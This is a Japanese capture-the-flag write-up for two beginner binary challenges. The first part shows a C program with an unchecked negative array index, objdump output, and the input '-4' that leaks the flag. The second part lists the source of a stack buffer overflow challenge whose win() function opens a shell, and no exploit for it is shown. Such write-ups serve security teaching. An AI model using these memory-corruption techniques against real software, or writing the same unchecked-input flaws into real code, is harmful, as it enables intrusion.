# 1 poem
与えられるソースを見る
``` c
#include <stdio.h>
#include <unistd.h>

char *flag = "ctf4b{***CENSORED***}";
char *poem[] = {
    "In the depths of silence, the universe speaks.",
    "Raindrops dance on windows, nature's lullaby.",
    "Time weaves stories with the threads of existence.",
    "Hearts entwined, two souls become one symphony.",
    "A single candle's glow can conquer the darkest room.",
};

int main() {
  int n;
  printf("Number[0-4]: ");
  scanf("%d", &n);
  if (n < 5) {
    printf("%s\n", poem[n]);
  }
  return 0;
}

__attribute__((constructor)) void init() {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  alarm(60);
}
```
配列の添え字をこちらで選択でき、マイナスの値を入れられるようだ

## (1) objdumpでデータのポインタの位置を確認する。
``` bash
kali:~$ objdump -D -M intel ./poem
(snip)

0000000000004020 <flag>:
    4020:       08 20                   or     BYTE PTR [rax],ah
        ...

0000000000004040 <poem>:
    4040:       20 20                   and    BYTE PTR [rax],ah
    4042:       00 00                   add    BYTE PTR [rax],al
    4044:       00 00                   add    BYTE PTR [rax],al
    4046:       00 00                   add    BYTE PTR [rax],al
    4048:       50                      push   rax
    4049:       20 00                   and    BYTE PTR [rax],al
    404b:       00 00                   add    BYTE PTR [rax],al
    404d:       00 00                   add    BYTE PTR [rax],al
    404f:       00 80 20 00 00 00       add    BYTE PTR [rax+0x20],al
    4055:       00 00                   add    BYTE PTR [rax],al
    4057:       00 b8 20 00 00 00       add    BYTE PTR [rax+0x20],bh
    405d:       00 00                   add    BYTE PTR [rax],al
    405f:       00 e8                   add    al,ch
    4061:       20 00                   and    BYTE PTR [rax],al
    4063:       00 00                   add    BYTE PTR [rax],al
    4065:       00 00                   add    BYTE PTR [rax],al
        ...

(snip)

```
* 0x4020(flag) - 0x4040(poem) = 0x20、-32byteだった、ポインタのサイズは、8byte(64bitのOSの場合)なので「-32 ÷ 8 = -4」
-4を投げてやると行けそうだ。

## (2) 実行
```
─$ ./poem
Number[0-4]: -4
ctf4b{y0u_sh0uld_v3rify_the_int3g3r_v4lu3}
```

できた。
# 2 rewriter2
## (1) src.c
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define BUF_SIZE 0x20
#define READ_SIZE 0x100

void __show_stack(void *stack);

int main() {
  char buf[BUF_SIZE];
  __show_stack(buf);

  printf("What's your name? ");
  read(0, buf, READ_SIZE);
  printf("Hello, %s\n", buf);

  __show_stack(buf);

  printf("How old are you? ");
  read(0, buf, READ_SIZE);
  puts("Thank you!");

  __show_stack(buf);
  return 0;
}

void win() {
  puts("Congratulations!");
  system("/bin/sh");
}

void __show_stack(void *stack) {
  unsigned long *ptr = stack;
  printf("\n %-19s| %-19s\n", "[Addr]", "[Value]");
  puts("====================+===================");
  for (int i = 0; i < 10; i++) {
    if (&ptr[i] == stack + BUF_SIZE + 0x8) {
      printf(" 0x%016lx | xxxxx hidden xxxxx  <- canary\n",
             (unsigned long)&ptr[i]);
      continue;
    }

    printf(" 0x%016lx | 0x%016lx ", (unsigned long)&ptr[i], ptr[i]);
    if (&ptr[i] == stack)
      printf(" <- buf");
    if (&ptr[i] == stack + BUF_SIZE + 0x10)
      printf(" <- saved rbp");
    if (&ptr[i] == stack + BUF_SIZE + 0x18)
      printf(" <- saved ret addr");
    puts("");
  }
  puts("");
}

__attribute__((constructor)) void init() {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  alarm(60);
}
```


